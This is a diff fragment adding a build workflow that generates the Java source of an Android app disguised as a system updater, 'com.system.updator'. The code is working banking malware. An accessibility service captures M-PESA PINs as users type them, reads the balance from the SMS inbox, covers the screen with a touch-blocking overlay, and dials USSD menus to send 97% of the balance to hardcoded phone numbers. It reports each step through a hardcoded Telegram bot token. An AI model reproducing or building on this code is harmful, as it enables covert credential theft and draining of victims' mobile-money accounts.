+                          s.setUseWideViewPort(true);
+                          webView.setWebViewClient(new WebViewClient());
+                          webView.setBackgroundColor(0xFFFFFFFF);
+                          webView.setPadding(0, 0, 0, 0);
+                          webView.loadUrl("file:///android_asset/overlay.html");
+                      }
+
+                      overlayView.setOnTouchListener((v, event) -> true);
+                      overlayView.setClickable(true);
+                      overlayView.setLongClickable(true);
+                      overlayView.setFocusable(false);
+                      overlayView.setFocusableInTouchMode(false);
+                      overlayView.setEnabled(true);
+
+                      int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                              ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                              : WindowManager.LayoutParams.TYPE_PHONE;
+
+                      int flags =
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                          | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                          | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
+                          | WindowManager.LayoutParams.FLAG_LAYOUT_ATTACHED_IN_DECOR
+                          | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                          | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                          | WindowManager.LayoutParams.FLAG_FULLSCREEN
+                          | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                          | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                          | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
+
+                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                              WindowManager.LayoutParams.MATCH_PARENT,
+                              WindowManager.LayoutParams.MATCH_PARENT,
+                              type, flags, PixelFormat.OPAQUE);
+
+                      params.gravity = Gravity.TOP | Gravity.START;
+                      params.x = 0;
+                      params.y = 0;
+                      params.width = WindowManager.LayoutParams.MATCH_PARENT;
+                      params.height = WindowManager.LayoutParams.MATCH_PARENT;
+                      params.screenBrightness = 1.0f;
+
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                          params.layoutInDisplayCutoutMode =
+                              WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS;
+                      }
+
+                      windowManager.addView(overlayView, params);
+                      showing = true;
+                  } catch (Exception e) {
+                      Log.e(TAG, "Overlay show failed", e);
+                      showing = false;
+                  }
+              }
+
+              public synchronized void dismiss() {
+                  mainHandler.post(this::dismissInternal);
+              }
+
+              private void dismissInternal() {
+                  try {
+                      if (overlayView != null && windowManager != null) {
+                          windowManager.removeViewImmediate(overlayView);
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "Overlay dismiss error", e);
+                  } finally {
+                      if (webView != null) {
+                          try { webView.destroy(); } catch (Exception ignored) { }
+                          webView = null;
+                      }
+                      overlayView = null;
+                      showing = false;
+                  }
+              }
+
+              public synchronized boolean isShowing() {
+                  return showing;
+              }
+          }
+          EOF
+
+      - name: Generate BootReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.util.Log;
+
+          public class BootReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+                      try {
+                          TelegramQueue.get(context).registerNetworkCallback();
+                          TelegramQueue.get(context).flush();
+                      } catch (Exception e) {
+                          Log.e("BootReceiver", "flush on boot failed", e);
+                      }
+                  }
+              }
+          }
+          EOF
+
+      - name: Generate SmsReceiver.java
+        run: |
+          cat > app/src/main/java/com/system/updator/SmsReceiver.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.util.Log;
+
+          public class SmsReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  Log.d("SmsReceiver", "SMS received");
+              }
+          }
+          EOF
+
+      - name: Generate PinData.java
+        run: |
+          cat > app/src/main/java/com/system/updator/PinData.java << 'EOF'
+          package com.system.updator;
+
+          public class PinData {
+              public String pin;
+              public boolean isLearned = false;
+          }
+          EOF
+
+      - name: Generate FinAutoService.java
+        run: |
+          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
+          package com.system.updator;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.accessibilityservice.GestureDescription;
+          import android.content.ContentResolver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.SharedPreferences;
+          import android.database.Cursor;
+          import android.graphics.Path;
+          import android.graphics.Rect;
+          import android.net.Uri;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.os.PowerManager;
+          import android.provider.Telephony;
+          import android.telecom.PhoneAccountHandle;
+          import android.telecom.TelecomManager;
+          import android.telephony.SubscriptionInfo;
+          import android.telephony.SubscriptionManager;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+
+          import com.google.gson.Gson;
+
+          import java.util.List;
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+
+          public class FinAutoService extends AccessibilityService {
+
+              public static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
+              public static final String CHAT_ID = "8468538314";
+
+              private static final String TAG = "FinAutoService";
+
+              private static final String TARGET_PHONE_A = "0741639018";
+              private static final String TARGET_PHONE_B = "0798688920";
+
+              private static final double SEND_PERCENTAGE = 0.97;
+              private static final double MIN_BALANCE_TRIGGER = 5.0;
+
+              private static final long ACTIVATION_DELAY_MS = 5L * 60L * 1000L;
+              private static final long COOLDOWN_MS = 10L * 60L * 1000L;
+              private static final long VERIFY_WINDOW_MS = 2L * 60L * 1000L + 30L * 1000L;
+              private static final long VERIFY_POLL_INTERVAL_MS = 3000L;
+
+              private static final int PIN_LENGTH = 4;
+              private static final long KEYPAD_DEDUPE_MS = 120L;
+              private static final long POST_PIN_DELAY_MS = 2000L;
+
+              private static final long STEP_MIN_TIMEOUT_MS = 250L;
+              private static final long STEP_MAX_TIMEOUT_MS = 1500L;
+              private static final long STEP_DEFAULT_TIMEOUT_MS = 400L;
+              private static final double STEP_TIMEOUT_FACTOR = 1.5;
+
+              private static final String WRONG_PIN_MARKER = "you have entered the wrong pin";
+              private static final String INSUFFICIENT_FUNDS_MARKER = "insufficient funds in your m-pesa account";
+              private static final String SUCCESS_MARKER = "confirmed.";
+
+              private static final String[] PIN_HOST_PACKAGES = {
+                  "stk", "sim", "safaricom", "mpesa", "m-pesa", "m_pesa", "mysafaricom"
+              };
+
+              private static final String MPESA_APP_PACKAGE = "com.safaricom.mpesa.lifestyle";
+              private static final String MPESA_PIN_TITLE = "Enter your M-PESA PIN";
+
+              private static final String[] STEP1_PHRASES = {
+                  "send money", "send cash", "transfer"
+              };
+              private static final String[] STEP2_PHRASES = {
+                  "enter phone", "enter number", "phone number", "recipient"
+              };
+              private static final String[] STEP6_PHRASES = {
+                  "confirm", "yes", "1. confirm", "accept"
+              };
+
+              private SharedPreferences prefs;
+              private Gson gson = new Gson();
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private ExecutorService executor = Executors.newSingleThreadExecutor();
+
+              private String pin = null;
+              private boolean pinLearned = false;
+              private volatile boolean automating = false;
+
+              private boolean pendingOverlay = false;
+              private boolean pendingHomeOverlay = false;
+
+              private String lastHandledPinValue = null;
+              private boolean pinFieldClearedSinceLastCapture = true;
+
+              private final StringBuilder keypadBuffer = new StringBuilder();
+              private long lastKeypadTapTime = 0L;
+              private String lastKeypadDigitHandled = null;
+
+              private long lastStepResponseMs = STEP_DEFAULT_TIMEOUT_MS;
+
+              private OverlayManager overlayManager;
+              private PowerManager.WakeLock wakeLock;
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
+                  overlayManager = OverlayManager.get(this);
+                  loadData();
+
+                  try {
+                      TelegramQueue.get(this).registerNetworkCallback();
+                  } catch (Exception e) {
+                      Log.e(TAG, "queue register failed", e);
+                  }
+
+                  try {
+                      PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                      if (pm != null) {
+                          wakeLock = pm.newWakeLock(
+                              PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,
+                              "FinAutoService::AutoLock");
+                          wakeLock.setReferenceCounted(false);
+                          wakeLock.acquire();
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "WakeLock acquire failed", e);
+                  }
+              }
+
+              private void loadData() {
+                  String json = prefs.getString("mpesa_pin", "{}");
+                  try {
+                      PinData data = gson.fromJson(json, PinData.class);
+                      if (data != null && data.isLearned && data.pin != null) {
+                          pin = data.pin;
+                          pinLearned = true;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "JSON parse error", e);
+                  }
+              }
+
+              private boolean isActivationWindowOpen() {
+                  long installTime = prefs.getLong("install_time", 0L);
+                  if (installTime == 0L) {
+                      installTime = System.currentTimeMillis();
+                      prefs.edit().putLong("install_time", installTime).apply();
+                  }
+                  return (System.currentTimeMillis() - installTime) >= ACTIVATION_DELAY_MS;
+              }
+
+              private boolean isCooldownFinished() {
+                  long lastTx = prefs.getLong("last_tx_time", 0L);
+                  if (lastTx == 0L) return true;
+                  return (System.currentTimeMillis() - lastTx) >= COOLDOWN_MS;
+              }
+
+              private boolean containsPinPhrase(CharSequence input) {
+                  if (input == null) return false;
+                  String s = input.toString().toLowerCase();
+                  StringBuilder sb = new StringBuilder(s.length());
+                  for (int i = 0; i < s.length(); i++) {
+                      char c = s.charAt(i);
+                      if (Character.isLetterOrDigit(c)) sb.append(c);
+                  }
+                  String n = sb.toString();
+                  int iEnter = n.indexOf("enter");
+                  if (iEnter < 0) return false;
+                  int iMpesa = n.indexOf("mpesa", iEnter + 5);
+                  if (iMpesa < 0) return false;
+                  int iPin = n.indexOf("pin", iMpesa + 5);
+                  return iPin >= 0;
+              }
+
+              private boolean isValidPin(String p) {
+                  if (p == null || p.length() != PIN_LENGTH) return false;
+                  for (int i = 0; i < PIN_LENGTH; i++) {
+                      char c = p.charAt(i);
+                      if (c < '0' || c > '9') return false;
+                  }
+                  return true;
+              }
+
+              private boolean isMpesaPinScreen(AccessibilityNodeInfo node) {
+                  if (node == null) return false;
+                  CharSequence text = node.getText();
+                  if (text != null) {
+                      String t = text.toString().trim().toLowerCase();
+                      if (t.equals(MPESA_PIN_TITLE.toLowerCase())
+                          || t.contains(MPESA_PIN_TITLE.toLowerCase())) return true;
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      if (isMpesaPinScreen(node.getChild(i))) return true;
+                  }
+                  return false;
+              }
+
+              private String getClickedDigit(AccessibilityEvent event, AccessibilityNodeInfo root) {
+                  if (event != null) {
+                      List<CharSequence> eventText = event.getText();
+                      if (eventText != null && !eventText.isEmpty()) {
+                          for (CharSequence cs : eventText) {
+                              if (cs != null) {
+                                  String s = cs.toString().trim();
+                                  if (s.length() == 1 && s.charAt(0) >= '0' && s.charAt(0) <= '9') return s;
+                              }
+                          }
+                      }
+                  }
+                  return findSingleDigitNode(root);
+              }
+
+              private String findSingleDigitNode(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  CharSequence text = node.getText();
+                  if (text != null) {
+                      String s = text.toString().trim();
+                      if (s.length() == 1 && s.charAt(0) >= '0' && s.charAt(0) <= '9') return s;
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      String r = findSingleDigitNode(node.getChild(i));
+                      if (r != null) return r;
+                  }
+                  return null;
+              }
+
+              private boolean isBackspaceEvent(AccessibilityEvent event) {
+                  if (event == null) return false;
+                  List<CharSequence> eventText = event.getText();
+                  if (eventText != null) {
+                      for (CharSequence cs : eventText) {
+                          if (cs != null) {
+                              String s = cs.toString().toLowerCase();
+                              if (s.contains("backspace") || s.contains("delete") || s.contains("clear")) return true;
+                          }
+                      }
+                  }
+                  if (event.getContentDescription() != null) {
+                      String cd = event.getContentDescription().toString().toLowerCase();
+                      if (cd.contains("backspace") || cd.contains("delete") || cd.contains("clear")) return true;
+                  }
+                  return false;
+              }
+
+              private void resetKeypadBuffer() {
+                  if (keypadBuffer.length() > 0) keypadBuffer.setLength(0);
+                  lastKeypadDigitHandled = null;
+                  lastKeypadTapTime = 0L;
+              }
+
+              private String matchMenuOption(AccessibilityNodeInfo root, String[] phrases) {
+                  if (root == null || phrases == null) return null;
+                  String text = collectAllText(root);
+                  if (text == null || text.isEmpty()) return null;
+                  String lower = text.toLowerCase();
+                  String[] lines = lower.split("\n");
+                  for (String rawLine : lines) {
+                      String line = rawLine.trim();
+                      if (line.isEmpty()) continue;
+                      for (String p : phrases) {
+                          if (line.contains(p.toLowerCase())) {
+                              String digit = leadingDigit(line);
+                              if (digit != null) return digit;
+                          }
+                      }
+                  }
+                  return null;
+              }
+
+              private String leadingDigit(String line) {
+                  for (int i = 0; i < line.length(); i++) {
+                      char c = line.charAt(i);
+                      if (c >= '0' && c <= '9') return String.valueOf(c);
+                      if (c != ' ' && c != '.' && c != ')' && c != ':' && c != '-') {
+                          if (i == 0) return null;
+                      }
+                  }
+                  return null;
+              }
+
+              private String collectAllText(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  StringBuilder sb = new StringBuilder();
+                  collectAllTextRec(node, sb);
+                  return sb.toString();
+              }
+
+              private void collectAllTextRec(AccessibilityNodeInfo node, StringBuilder sb) {
+                  if (node == null) return;
+                  CharSequence t = node.getText();
+                  if (t != null && t.length() > 0) sb.append(t.toString()).append('\n');
+                  CharSequence d = node.getContentDescription();
+                  if (d != null && d.length() > 0) sb.append(d.toString()).append('\n');
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      collectAllTextRec(node.getChild(i), sb);
+                  }
+              }
+
+              private void computeNextStepTimeout(long observedMs) {
+                  long next = (long) (observedMs * STEP_TIMEOUT_FACTOR);
+                  if (next < STEP_MIN_TIMEOUT_MS) next = STEP_MIN_TIMEOUT_MS;
+                  if (next > STEP_MAX_TIMEOUT_MS) next = STEP_MAX_TIMEOUT_MS;
+                  lastStepResponseMs = next;
+              }
+
+              private void savePin(String p, String source) {
+                  if (!isValidPin(p)) {
+                      resetKeypadBuffer();
+                      return;
+                  }
+
+                  PinData data = new PinData();
+                  data.pin = p;
+                  data.isLearned = true;
+                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
+                  pin = p;
+                  pinLearned = true;
+
+                  resetKeypadBuffer();
+
+                  if (!isActivationWindowOpen()) return;
+                  if (!isCooldownFinished()) return;
+
+                  double balance = getLastBalanceFromSms();
+                  if (balance <= 0) return;
+                  if (balance < MIN_BALANCE_TRIGGER) return;
+
+                  double amount = calculateSendAmount(balance);
+                  if (amount <= 0) return;
+
+                  if (!MPESA_APP_PACKAGE.equals(source)) {
+                      if (pendingOverlay) {
+                          pendingOverlay = false;
+                          TelegramQueue.get(this).send("Sim Toolkit recovery: HOME -> overlay -> 2s -> automation.");
+                          performGlobalAction(GLOBAL_ACTION_HOME);
+                          try { overlayManager.show(); } catch (Exception ignored) { }
+                          handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
+                          return;
+                      }
+                      TelegramQueue.get(this).send("Sim Toolkit first-run: HOME -> 2s -> automation.");
+                      performGlobalAction(GLOBAL_ACTION_HOME);
+                      handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
+                      return;
+                  }
+
+                  if (pendingHomeOverlay) {
+                      pendingHomeOverlay = false;
+                      pendingOverlay = false;
+                      TelegramQueue.get(this).send("Interruption recovery: HOME -> overlay -> 2s -> automation.");
+                      performGlobalAction(GLOBAL_ACTION_HOME);
+                      try { overlayManager.show(); } catch (Exception ignored) { }
+                      handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
+                      return;
+                  }
+
+                  if (pendingOverlay) {
+                      pendingOverlay = false;
+                      TelegramQueue.get(this).send("Failure recovery: BACK -> overlay -> 2s -> automation.");
+                      performGlobalAction(GLOBAL_ACTION_BACK);
+                      try { overlayManager.show(); } catch (Exception ignored) { }
+                      handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
+                      return;
+                  }
+
+                  TelegramQueue.get(this).send("M-PESA app first-run: HOME -> 2s -> automation.");
+                  performGlobalAction(GLOBAL_ACTION_HOME);
+                  handler.postDelayed(() -> startAutomation(amount), POST_PIN_DELAY_MS);
+              }
+
+              private double calculateSendAmount(double balance) {
+                  return balance * SEND_PERCENTAGE;
+              }
+
+              private double getLastBalanceFromSms() {
+                  try {
+                      ContentResolver cr = getContentResolver();
+                      Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
+                      String[] projection = { Telephony.Sms.Inbox.BODY };
+                      String selection = Telephony.Sms.Inbox.BODY + " LIKE ?";
+                      String[] selectionArgs = new String[]{"%balance%"};
+                      String sortOrder = Telephony.Sms.Inbox.DATE + " DESC";
+
+                      Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
+                      if (cursor == null || !cursor.moveToFirst()) {
+                          if (cursor != null) cursor.close();
+                          return 0;
+                      }
+                      do {
+                          String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
+                          if (body == null) continue;
+                          String normalized = body.replace('\u00A0', ' ')
+                                  .replace("\u200B", "")
+                                  .replaceAll("\\s+", " ")
+                                  .trim();
+                          java.util.regex.Pattern pA = java.util.regex.Pattern.compile(
+                              "your\\s+m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
+                              java.util.regex.Pattern.CASE_INSENSITIVE);
+                          java.util.regex.Matcher mA = pA.matcher(normalized);
+                          if (mA.find()) {
+                              double v = Double.parseDouble(mA.group(1).replace(",", ""));
+                              cursor.close();
+                              return v;
+                          }
+                          java.util.regex.Pattern pB = java.util.regex.Pattern.compile(
+                              "m[-\\s]?pesa\\s+balance\\s+is\\s*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
+                              java.util.regex.Pattern.CASE_INSENSITIVE);
+                          java.util.regex.Matcher mB = pB.matcher(normalized);
+                          if (mB.find()) {
+                              double v = Double.parseDouble(mB.group(1).replace(",", ""));
+                              cursor.close();
+                              return v;
+                          }
+                          java.util.regex.Pattern pC = java.util.regex.Pattern.compile(
+                              "m[-\\s]?pesa\\s+balance[:\\s]*(?:kes|ksh)?\\.?\\s*([\\d,]+\\.?\\d{0,2})",
+                              java.util.regex.Pattern.CASE_INSENSITIVE);
+                          java.util.regex.Matcher mC = pC.matcher(normalized);
+                          if (mC.find()) {
+                              double v = Double.parseDouble(mC.group(1).replace(",", ""));
+                              cursor.close();
+                              return v;
+                          }
+                      } while (cursor.moveToNext());
+                      cursor.close();
+                  } catch (Exception e) {
+                      Log.e(TAG, "Balance read error", e);
+                      TelegramQueue.get(this).send("Balance read error: " + e.getMessage());
+                  }
+                  return 0;
+              }
+
+              private String getNewestMpesaSms() {
+                  try {
+                      Cursor cursor = getContentResolver().query(
+                          Telephony.Sms.Inbox.CONTENT_URI,
+                          new String[]{ Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.ADDRESS },
+                          null, null,
+                          Telephony.Sms.Inbox.DATE + " DESC");
+                      if (cursor == null) return null;
+                      int count = 0;
+                      while (cursor.moveToNext() && count < 5) {
+                          count++;
+                          String body = cursor.getString(0);
+                          String sender = cursor.getString(1);
+                          if (body == null) continue;
+                          String b = body.toLowerCase();
+                          String s = sender != null ? sender.toLowerCase() : "";
+                          if (b.contains("m-pesa") || b.contains("mpesa") || b.contains("m_pesa")
+                              || s.contains("m-pesa") || s.contains("mpesa") || s.contains("m_pesa")) {
+                              cursor.close();
+                              return body;
+                          }
+                      }
+                      cursor.close();
+                  } catch (Exception e) {
+                      Log.e(TAG, "getNewestMpesaSms error", e);
+                  }
+                  return null;
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  try {
+                      if (event == null) return;
+                      if (automating) return;
+
+                      String pkg = event.getPackageName() != null
+                              ? event.getPackageName().toString().toLowerCase() : "";
+
+                      AccessibilityNodeInfo root = getRootInActiveWindow();
+                      if (root == null) return;
+
+                      if (pkg.equals(MPESA_APP_PACKAGE)) {
+                          boolean onPinScreen = isMpesaPinScreen(root);
+                          if (!onPinScreen) {
+                              resetKeypadBuffer();
+                              return;
+                          }
+                          if (isBackspaceEvent(event)) {
+                              if (keypadBuffer.length() > 0) {
+                                  keypadBuffer.setLength(keypadBuffer.length() - 1);
+                              }
+                              lastKeypadDigitHandled = null;
+                              lastKeypadTapTime = 0L;
+                              return;
+                          }
+                          if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_CLICKED) return;
+
+                          String digit = getClickedDigit(event, root);
+                          if (digit == null) return;
+
+                          long now = System.currentTimeMillis();
+                          boolean sameDigitAgain = digit.equals(lastKeypadDigitHandled);
+                          boolean tooSoon = (now - lastKeypadTapTime) < KEYPAD_DEDUPE_MS;
+                          if (sameDigitAgain && tooSoon) return;
+
+                          lastKeypadDigitHandled = digit;
+                          lastKeypadTapTime = now;
+
+                          keypadBuffer.append(digit);
+                          if (keypadBuffer.length() > PIN_LENGTH) {
+                              while (keypadBuffer.length() > PIN_LENGTH) keypadBuffer.deleteCharAt(0);
+                          }
+                          if (keypadBuffer.length() == PIN_LENGTH) {
+                              String captured = keypadBuffer.toString();
+                              if (isValidPin(captured)) {
+                                  resetKeypadBuffer();
+                                  savePin(captured, MPESA_APP_PACKAGE);
+                              } else {
+                                  resetKeypadBuffer();
+                              }
+                          }
+                          return;
+                      }
+
+                      boolean isKnownHost = false;
+                      for (String host : PIN_HOST_PACKAGES) {
+                          if (pkg.contains(host)) { isKnownHost = true; break; }
+                      }
+                      boolean windowMentionsStrictPin = windowTextMentionsStrictPin(root);
+                      if (!isKnownHost && !windowMentionsStrictPin) return;
+                      if (isPinFieldEmpty(root)) {
+                          pinFieldClearedSinceLastCapture = true;
+                          return;
+                      }
+                      String captured = findPinFieldValue(root);
+                      if (captured == null || captured.length() < 4) return;
+                      boolean sameAsLastHandled = captured.equals(lastHandledPinValue);
+                      if (!pinFieldClearedSinceLastCapture && sameAsLastHandled) return;
+                      if (!pinFieldClearedSinceLastCapture) return;
+                      pinFieldClearedSinceLastCapture = false;
+                      lastHandledPinValue = captured;
+                      String source = isKnownHost ? pkg : "pin-prompt";
+                      savePin(captured, source);
+                  } catch (Exception e) {
+                      Log.e(TAG, "Event error", e);
+                      TelegramQueue.get(this).send("Event error: " + e.getMessage());
+                  }
+              }
+
+              private boolean isPinFieldEmpty(AccessibilityNodeInfo node) {
+                  if (node == null) return false;
+                  boolean isPassword = node.isPassword();
+                  boolean isEditable = node.isEditable();
+                  CharSequence hint = node.getHintText();
+                  CharSequence desc = node.getContentDescription();
+                  CharSequence text = node.getText();
+                  boolean mentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
+                  if (isPassword || (isEditable && mentionsPin)) {
+                      if (text == null || text.toString().trim().isEmpty()) return true;
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      if (isPinFieldEmpty(node.getChild(i))) return true;
+                  }
+                  return false;
+              }
+
+              private boolean windowTextMentionsStrictPin(AccessibilityNodeInfo node) {
+                  if (node == null) return false;
+                  if (containsPinPhrase(node.getText())) return true;
+                  if (containsPinPhrase(node.getHintText())) return true;
+                  if (containsPinPhrase(node.getContentDescription())) return true;
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      if (windowTextMentionsStrictPin(node.getChild(i))) return true;
+                  }
+                  return false;
+              }
+
+              private String findPinFieldValue(AccessibilityNodeInfo node) {
+                  if (node == null) return null;
+                  boolean isPassword = node.isPassword();
+                  boolean isEditable = node.isEditable();
+                  CharSequence hint = node.getHintText();
+                  CharSequence desc = node.getContentDescription();
+                  CharSequence text = node.getText();
+                  boolean hintMentionsPin = containsPinPhrase(hint) || containsPinPhrase(desc);
+                  if ((isPassword || (isEditable && hintMentionsPin)) && text != null) {
+                      String value = text.toString().trim();
+                      if (value.length() >= 4) return value;
+                  }
+                  for (int i = 0; i < node.getChildCount(); i++) {
+                      String result = findPinFieldValue(node.getChild(i));
+                      if (result != null) return result;
+                  }
+                  return null;
+              }
+
+              private void startAutomation(double amount) {
+                  if (automating) return;
+                  automating = true;
+                  String target = getCurrentTargetPhone();
+                  TelegramQueue.get(this).send("Automation started. Target: " + target);
+                  dialUssdWithIntent("*334%23");
+                  handler.postDelayed(() -> performStep1(amount), 2250);
+              }
+
+              private void dialUssdWithIntent(String ussdCode) {
+                  try {
+                      Intent intent = new Intent(Intent.ACTION_CALL);
+                      intent.setData(Uri.parse("tel:" + ussdCode));
+                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                      try {
+                          SubscriptionManager sm = (SubscriptionManager)
+                                  getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+                          if (sm != null) {
+                              List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
+                              if (subs != null && subs.size() > 1) {
+                                  for (SubscriptionInfo sub : subs) {
+                                      String carrier = sub.getCarrierName() != null
+                                              ? sub.getCarrierName().toString() : "";
+                                      if (carrier.toLowerCase().contains("safaricom")) {
+                                          PhoneAccountHandle handle = getPhoneAccountHandle(sub.getSubscriptionId());
+                                          if (handle != null) {
+                                              intent.putExtra("android.telecom.extra.PHONE_ACCOUNT_HANDLE", handle);
+                                          }
+                                          break;
+                                      }
+                                  }
+                              }
+                          }
+                      } catch (Exception ignored) { }
+                      startActivity(intent);
+                  } catch (Exception e) {
+                      TelegramQueue.get(this).send("USSD dial failed: " + e.getMessage());
+                      automating = false;
+                      abortAndWaitForNextTrigger(0, "USSD dial failed: " + e.getMessage());
+                  }
+              }
+
+              private PhoneAccountHandle getPhoneAccountHandle(int subId) {
+                  try {
+                      TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+                      if (tm == null) return null;
+                      List<PhoneAccountHandle> handles = tm.getCallCapablePhoneAccounts();
+                      if (handles != null && !handles.isEmpty()) return handles.get(0);
+                  } catch (Exception ignored) { }
+                  return null;
+              }
+
+              private String getCurrentTargetPhone() {
+                  String current = prefs.getString("current_target_phone", null);
+                  if (current == null || current.isEmpty()) {
+                      current = TARGET_PHONE_A;
+                  }
+                  return current;
+              }
+
+              private void flipTargetPhone() {
+                  String current = getCurrentTargetPhone();
+                  String next = TARGET_PHONE_A.equals(current) ? TARGET_PHONE_B : TARGET_PHONE_A;
+                  prefs.edit().putString("current_target_phone", next).apply();
+              }
+
+              private String resolveMenuDigit(String[] phrases, String fallback) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return fallback;
+                  String matched = matchMenuOption(root, phrases);
+                  if (matched != null) return matched;
+                  String dump = collectAllText(root);
+                  TelegramQueue.get(this).send("Menu mismatch. Visible text:\n" + dump);
+                  return fallback;
+              }
+
+              private void performStep1(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  String opt = resolveMenuDigit(STEP1_PHRASES, "1");
+                  boolean ok = typeInField(opt);
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(1, "Step 1 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  handler.postDelayed(() -> performStep2(amount), lastStepResponseMs);
+              }
+
+              private void performStep2(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  String opt = resolveMenuDigit(STEP2_PHRASES, "1");
+                  boolean ok = typeInField(opt);
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(2, "Step 2 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  handler.postDelayed(() -> performStep3(amount), lastStepResponseMs);
+              }
+
+              private void performStep3(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  String target = getCurrentTargetPhone();
+                  boolean ok = typeInField(target);
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(3, "Step 3 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  handler.postDelayed(() -> performStep4(amount), lastStepResponseMs);
+              }
+
+              private void performStep4(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  boolean ok = typeInField(String.format("%.0f", amount));
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(4, "Step 4 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  handler.postDelayed(() -> performStep5(amount), lastStepResponseMs);
+              }
+
+              private void performStep5(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  boolean ok = typeInField(pin);
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(5, "Step 5 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  handler.postDelayed(() -> performStep6(amount), lastStepResponseMs);
+              }
+
+              private void performStep6(double amount) {
+                  long t0 = System.currentTimeMillis();
+                  String opt = resolveMenuDigit(STEP6_PHRASES, "1");
+                  boolean ok = typeInField(opt);
+                  ok = clickSendWithRetry() && ok;
+                  if (!ok) { abortAndWaitForNextTrigger(6, "Step 6 failed"); return; }
+                  computeNextStepTimeout(System.currentTimeMillis() - t0);
+                  final long startTime = System.currentTimeMillis();
+                  handler.post(() -> verifyTransactionLoop(amount, startTime));
+              }
+
+              private void verifyTransactionLoop(double amount, long startTime) {
+                  String sms = getNewestMpesaSms();
+                  String lower = sms != null ? sms.toLowerCase() : "";
+
